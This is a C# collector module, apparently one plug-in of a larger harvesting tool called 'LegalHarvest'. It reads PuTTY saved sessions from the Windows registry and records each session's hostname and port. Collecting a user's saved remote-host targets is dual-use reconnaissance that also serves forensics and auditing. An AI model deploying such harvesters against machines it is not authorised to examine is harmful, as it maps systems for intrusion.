using Microsoft.Win32;
using System;
using System.Collections.Generic;

namespace LegalHarvest.Modules
{
    public class PuttySessionsModule : ICollectorModule
    {
        public string ModuleName => "PuttySessions";
        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\SimonTatham\PuTTY\Sessions"))
            {
                if (key == null) return items;
                foreach (string sessionName in key.GetSubKeyNames())
                {
                    using (var sessionKey = key.OpenSubKey(sessionName))
                    {
                        string hostname = sessionKey?.GetValue("HostName") as string;
                        string port = sessionKey?.GetValue("PortNumber")?.ToString();
                        if (!string.IsNullOrEmpty(hostname))
                            items.Add(new CollectedItem { Category = "Putty", Name = sessionName, Value = $"{hostname}:{port ?? "22"}", Timestamp = DateTime.Now });
                    }
                }
            }
            return items;
        }
    }
}
